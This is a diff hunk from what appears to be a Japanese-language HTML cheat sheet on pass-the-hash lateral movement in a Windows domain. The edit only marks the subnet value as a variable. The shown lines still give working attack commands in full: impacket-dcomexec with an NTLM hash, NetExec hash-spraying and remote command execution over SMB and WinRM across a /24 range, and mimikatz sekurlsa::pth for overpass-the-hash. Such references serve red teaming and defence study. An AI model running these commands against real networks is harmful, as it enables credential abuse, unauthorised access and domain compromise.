@@ -835,9 +835,9 @@ impacket-dcomexec -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> -object MMC2
   contoso.local/user@target.contoso.local</code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># NetExec — bulk 試行 + 横展開探索</span>
-netexec smb 10.10.10.0/24 -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local --local-auth
-netexec smb 10.10.10.0/24 -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local -x 'whoami /priv'
-netexec winrm 10.10.10.0/24 -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local</code></pre></div>
+netexec smb <span class="v" data-var="CIDR">10.10.10.0/24</span> -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local --local-auth
+netexec smb <span class="v" data-var="CIDR">10.10.10.0/24</span> -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local -x 'whoami /priv'
+netexec winrm <span class="v" data-var="CIDR">10.10.10.0/24</span> -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local</code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows — Over-PtH (mimikatz)</span>
 mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local \
